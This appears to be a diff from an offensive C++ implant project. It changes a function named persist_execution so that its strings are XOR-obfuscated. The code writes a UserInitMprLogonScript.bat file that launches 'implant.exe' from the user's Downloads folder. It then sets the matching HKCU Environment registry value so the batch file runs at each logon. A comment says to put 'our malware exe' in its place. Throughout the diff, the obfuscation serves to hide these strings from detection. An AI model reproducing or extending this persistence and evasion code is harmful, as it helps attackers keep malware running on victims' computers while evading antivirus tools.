@@ -16,21 +16,21 @@ void persist_execution(std::string username){
 
    std::string path;
    char* c = strcpy(new char[path.length() + 1], path.c_str());
-   sprintf(c,"@start \"c:\\users\\%s\\Downloads\\implant.exe\\\"\n",username.c_str());
+   sprintf(c,xor_string("Bqvcpv\" a8^wqgpq^'q^Fmulnmcfq^kornclv,gzg ^l",0x02).c_str(),username.c_str());
    path.assign(c,strlen(c));
 
-
-   mkdir("c:\\Batch");
+    std::string folder = xor_string("a8^@cvaj",0x02);
+   mkdir(folder.c_str());
 
    // Writes to a new bat file
    std::ofstream batfile;
-   batfile.open("c:\\Batch\\UserInitMprLogonScript.bat");
+   batfile.open(xor_string("a8^@cvaj^WqgpKlkvOrpNmemlQapkrv,`cv",0x02) );
 
    // Commands for file
-   batfile << "@echo off\n";
+   batfile << xor_string("Bgajm\"mdd^l",0x02);
    //change this line with our malware exe
    batfile << path;
-   batfile << "@pause\n";
+   batfile << xor_string("Brcwqg^l",0x02);
    // Close the file since finished with writing
    batfile.close();
 
@@ -38,13 +38,16 @@ void persist_execution(std::string username){
     // Following section creates a registry key to open bat file on Window startup
     // https://stackoverflow.com/questions/508614/create-a-new-windows-registry-key-using-c
     HKEY hKey;
-    LPCTSTR environment = TEXT("Environment");
+    std::string blank = xor_string("Gltkpmloglv",0x02);
+    LPCTSTR environment = TEXT(blank.c_str());
 
 
     LONG test = RegCreateKeyEx(HKEY_CURRENT_USER, environment, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
 
-    LPCTSTR name = TEXT("UserInitMprLogonScript");
-    LPCTSTR data = TEXT("c:\\test\\UserInitMprLogonScript.bat");
+    std::string blank1 = xor_string("WqgpKlkvOrpNmemlQapkrv",0x02);
+    LPCTSTR name = TEXT(blank1.c_str());
+    std::string blank2 = xor_string("a8^vgqv^WqgpKlkvOrpNmemlQapkrv,`cv",0x02);
+    LPCTSTR data = TEXT(blank2.c_str());
 
     LONG test2 = RegSetValueEx(hKey, name, 0, REG_SZ, (LPBYTE) data, (_tcslen(data)+1)*sizeof(TCHAR));
 
